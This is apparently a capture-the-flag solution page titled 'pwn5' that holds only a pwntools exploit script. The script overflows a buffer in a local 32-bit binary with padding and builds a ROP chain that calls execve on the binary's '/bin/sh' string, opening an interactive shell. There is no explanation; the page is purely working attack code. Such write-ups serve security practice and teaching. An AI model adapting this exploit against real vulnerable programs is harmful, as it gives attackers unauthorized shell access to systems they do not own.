---
title: "pwn5"
points: N/A
tags: ["pwn"]
---

```python
from pwn import *

binary_name = "./pwn5"
elf = context.binary = ELF(binary_name)
DEBUG = True

if DEBUG:
    p = gdb.debug(binary_name, '''
        break *laas+61
        continue
    ''')
else:
    p = process(binary_name)

rop = ROP(elf)
rop.raw(b'a'*17)
rop.raw(p32(elf.symbols['execve']))
rop.raw(p32(0xffffffff))
rop.raw(p32(next(elf.search(b'/bin/sh\x00'))))
rop.raw(p32(0))
rop.raw(p32(0))

p.recv()
p.sendline(rop.chain())

p.interactive()
```